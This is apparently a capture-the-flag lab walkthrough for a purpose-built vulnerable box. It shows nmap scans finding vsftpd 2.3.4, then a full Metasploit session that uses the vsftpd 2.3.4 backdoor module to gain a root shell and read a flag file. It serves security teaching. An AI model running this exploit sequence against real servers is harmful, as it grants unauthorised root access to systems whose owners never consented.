This box is set up to contain a simple VSFTP vulnerability.

Once the box is running, a user can start by performing a simple nmap scan of the vulnerable IP address. The machine is shown to have SSH running on port 22, as expected, and FTP running on port 21, which seems much more intentional. By simply switching to an aggressive scan of that port, nmap reports that the version vsftpd 2.3.4 is in use. This particular version is famously vulnerable, and it is relatively straightforward to get a root shell on machines running this version.

```
knittingirl@knittingirl-OptiPlex-7060:~/Desktop/Simple-Vulnerable-Boxes/Windows Webshell$ nmap 192.168.56.22
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-06 19:15 EST
Nmap scan report for 192.168.56.22
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
knittingirl@knittingirl-OptiPlex-7060:~/Desktop/Simple-Vulnerable-Boxes/Windows Webshell$ nmap 192.168.56.22 -A -p 21
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-06 19:15 EST
Nmap scan report for 192.168.56.22
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/nonexistent".
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

```

The most straightforward way in which to exploit this service is by using metasploit, which is a straightforward framework that comes pre-packaged with a range of popular exploits. The following terminal snippet shows how a root shell can be obtained using this software.

```
knittingirl@knittingirl-OptiPlex-7060:~/Desktop/Simple-Vulnerable-Boxes/$ msfconsole

Metasploit tip: You can use help to view all available commands
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.4.13-dev-                         ]
+ -- --=[ 2426 exploits - 1250 auxiliary - 428 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search vsftp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 1
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[
                                       ,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.me
                                       tasploit.com/docs/using-metasploit/basi
                                       cs/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.22
RHOSTS => 192.168.56.22
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.56.22:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.22:21 - USER: 331 Please specify the password.
[+] 192.168.56.22:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.22:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.1:39165 -> 192.168.56.22:6200) at 2025-01-06 19:22:56 -0500

whoami
root
ls /root
root.txt
cat /root/root.txt
flag{vsftpd_exploit_is_fun}

```
